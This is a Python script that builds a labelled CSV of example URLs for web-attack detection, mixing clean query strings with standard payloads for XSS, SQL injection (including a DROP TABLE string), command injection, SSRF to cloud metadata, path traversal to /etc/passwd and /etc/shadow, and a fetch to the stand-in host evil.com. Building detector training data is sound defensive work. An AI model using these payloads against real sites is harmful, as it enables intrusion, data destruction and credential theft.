import csv
import urllib.parse
import random

# Sample payloads per attack type (simplified)
payloads = {
    "XSS": [
        "<script>alert('XSS')</script>",
        '"><img src=x onerror=alert(1)>',
        "<svg onload=alert(1)>",
        "javascript:alert('XSS')"
    ],
    "SQL Injection": [
        "1' OR '1'='1",
        "admin' --",
        "1'; DROP TABLE users --"
    ],
    "Command Injection": [
        ";ls",
        "&&whoami",
        "|cat /etc/passwd"
    ],
    "SSRF": [
        "http://127.0.0.1",
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/"
    ],
    "Path Traversal": [
        "../../etc/passwd",
        "../../etc/shadow",
        "../..//var/log"
    ],
    "CSRF": [
        "<form action='http://evil.com'><input type='submit'></form>",
        "<script>fetch('http://evil.com')</script>"
    ]
}

params = ["q", "id", "search", "content", "cmd", "url", "file", "user", "token", "path", "data", "input", "redirect"]

dataset = []

# Generate malicious examples
for _ in range(1000):
    attack_type = random.choice(list(payloads.keys()))
    payload = random.choice(payloads[attack_type])
    param = random.choice(params)
    encoded_payload = urllib.parse.quote(payload, safe='')
    url = f"https://example.com/?{param}={encoded_payload}"
    description = f"{attack_type} payload: {payload}"
    dataset.append([url, attack_type, description])

# Generate clean examples
clean_inputs = [
    "apple", "banana", "user123", "id=567", "page=home", "feedback", "query=help", "logout=true",
    "hello", "search=products", "lang=en", "about-us", "category=books", "filter=popular", "name=JohnDoe"
]

for _ in range(300):
    param = random.choice(params)
    value = random.choice(clean_inputs)
    encoded = urllib.parse.quote(value, safe='')
    url = f"https://example.com/?{param}={encoded}"
    dataset.append([url, "NONE", "Safe input"])

# Shuffle the dataset for randomness
random.shuffle(dataset)

# Write to CSV
with open("better_malicious_dataset.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["URL", "Attack_Type", "Payload_Description"])
    writer.writerows(dataset)

print("Generated dataset: better_malicious_dataset.csv")
